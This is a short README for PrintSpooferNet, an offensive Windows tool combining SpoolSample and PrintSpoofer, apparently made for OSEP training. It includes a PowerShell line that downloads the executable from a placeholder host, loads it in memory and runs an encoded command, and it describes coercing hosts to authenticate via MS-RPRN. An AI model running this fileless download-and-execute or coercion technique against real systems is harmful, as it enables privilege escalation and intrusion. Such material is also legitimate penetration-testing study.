# PrintSpooferNet
Modified version of SpoolSample + PrintSpoofer. Made for OSEP. Able to run in memory directly

e.g. in memory:
```powershell
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://ip/PrintSpooferNet.exe'))
[PrintSpooferNet.Program]::Main(@("any_pipe_name", "powershell -enc <base64>"))
```

# SpoolSample
PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface.  This is possible via other protocols as well.

This tool is released as is.  Don't expect any support or extensions to it.

Presentation: The Unintended Risks of Trusting Active Directory @ DerbyCon 2018
- https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
- @tifkin_ (Lee Christensen), @harmj0y(Will Schroeder), @enigma0x3(Matt Nelson)

MS-RPRN - Print System Remote Protocol
 - https://msdn.microsoft.com/en-us/library/cc244528.aspx
